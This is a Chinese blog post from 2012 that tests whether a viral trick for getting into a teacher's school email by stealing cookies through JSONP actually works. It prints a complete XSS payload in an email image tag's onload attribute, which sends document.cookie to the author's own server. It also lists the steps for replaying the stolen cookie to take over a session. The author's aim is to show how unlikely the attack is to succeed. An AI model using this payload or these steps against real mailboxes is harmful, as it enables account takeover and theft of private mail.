---
title: 看上去很美 为什么JSONP跨域获取cookie登录老师邮箱不现实
tags: 

  - cookie
  - jsonp
permalink: jsonp-cross-domain-get-cookie
id: 126
updated: '2012-12-30 15:24:39'
date: 2012-12-30 15:24:39
---

<p>昨天一位朋友在微博上看到一篇名为《如何通过入侵老师邮箱拿到期末考卷和修改成绩》的长微博，并@我问是否可行。我大概扫了一眼，第一反应就是现在哪还会有邮箱允许直接编辑 html 代码，退一万步讲，就算能编辑，怎么可能会让 onload 这种逆天的标签存在。不过当我使用自己学校的邮箱测试之后，发现&hellip;&hellip;我太天真了。</p>
<p>但是，这意味着网上流传的这篇文章是真的可行吗？经过实际测试，我认为成功的概率非常之低。下面介绍一下测试过程：</p>
<ul>
<li>我的邮箱：xxxxsen@bjut.edu.cn</li>
<li>朋友的邮箱：xxjie@bjut.edu.cn&nbsp;</li>
<li>欲实现的目的：发一封邮件给朋友，然后登陆朋友的邮箱（当然是不知道他的账号密码的前提下）</li>
</ul>
<h2>具体过程</h2>
<p>1、在自己的服务器上写一个 php 脚本，用来发送经过 JSONP 传来的 cookie</p>
<p>简单的说就是用 mail() 函数发送 $_GET['cookie']，详细代码不赘述</p>
<p>2、给朋友发一封邮件，内容为</p>
<pre class="brush: jscript;fontsize: 100; first-line: 1; ">&lt;img src="http://img.t.sinajs.cn/t35/style/images/common/face/ext/normal/5c/yw_org.gif" onload="var s = document.createElement('script'); var cookie = document.cookie; cookie = encodeURI(cookie); s.src='http://ask.xxxos.com/test.php?cookie=' + cookie; document.body.appendChild(s); "&gt;</pre>
<p>这封邮件表面看起来就是一个新浪微博的表情，但是却将 cookie escape 之后当一个参数传给了我第一步写好的脚本</p>
<p>3、朋友收到邮件，我也收到了他的 cookie，unescape</p>
<p>4、先用 chrome 登录自己的邮箱，打开控制台删除 cookie，然后在地址栏输入</p>
<p>javascript: document.cookie = 'unescape 之后的cookie'</p>
<p>5、刷新之后提示需要重新登录，在登录界面依然输入自己的账号密码，但是登录之后已经是朋友的邮箱了</p>
<h2>结果演示</h2>
<p>我的邮箱</p>
<p><img src="http://ww3.sinaimg.cn/mw690/831e9385jw1e0bs7yjrnwj.jpg" alt="我的邮箱" width="600" height="292" /></p>
<p>成功登录朋友的邮箱</p>
<p><img src="http://ww4.sinaimg.cn/mw690/831e9385jw1e0bs7xwq9fj.jpg" alt="朋友的邮箱" width="600" height="192" /></p>
<p>可以看到朋友邮箱最新收到的那封邮件，就是整个登录过程的关键。</p>
<h2>为什么不可行</h2>
<p>这篇文章不是为了重复一下网上已有的过程，而是为了说明虽然在技术上可以实现，但是在实际操作时，JSONP 跨域会遇到很多的问题。</p>
<p>PS.尤其上网上那篇文章针对的还是软件学院的老师，老师们上当的概率微乎其微。</p>
<p>1、Chrome 的现代浏览器会直接阻止跨域调用</p>
<p><img src="http://ww4.sinaimg.cn/mw690/831e9385jw1e0bs7quablj.jpg" alt="chrome 组织跨域调用" width="600" height="105" /></p>
<p>注意红框里的内容，chrome 直接阻止了 JSONP 的跨域请求</p>
<p>2、对于 IE 这些渣渣浏览器，也会提示有安全内容，也就是说这些东西是默认不加载的，除非老师心情好又点了一下显示安全内容</p>
<p><strong>IE 9 的安全提示</strong></p>
<p><img src="http://ww1.sinaimg.cn/mw690/831e9385jw1e0bs7xqy7uj.jpg" alt="ie9 安全提示" width="600" height="87" /></p>
<p><strong>IE 6 的安全提示</strong></p>
<p><img src="http://ww4.sinaimg.cn/mw690/831e9385jw1e0bs7rjg5dj.jpg" alt="ie6 安全提示" width="600" height="207" /></p>
<p>出于时间考虑，就没有测试更多的浏览器了（今天一天浪费了一大半啊！！），但是总的来说要成功是非常难的。</p>
<h2>怎样才能成功</h2>
<p>根据以上测试结果，我大概总结了一下必须满足哪些客观条件我们才能实现登录老师的邮箱：</p>
<ul>
<li>老师使用的是校内邮箱，且这些邮箱里有我们需要的资料</li>
<li>老师使用的是 IE 等渣渣浏览器</li>
<li>老师没事喜欢加载一些&ldquo;可能不安全的内容&rdquo;</li>
</ul>
<p>综合起来看，成功的概率不超过 5 %。</p>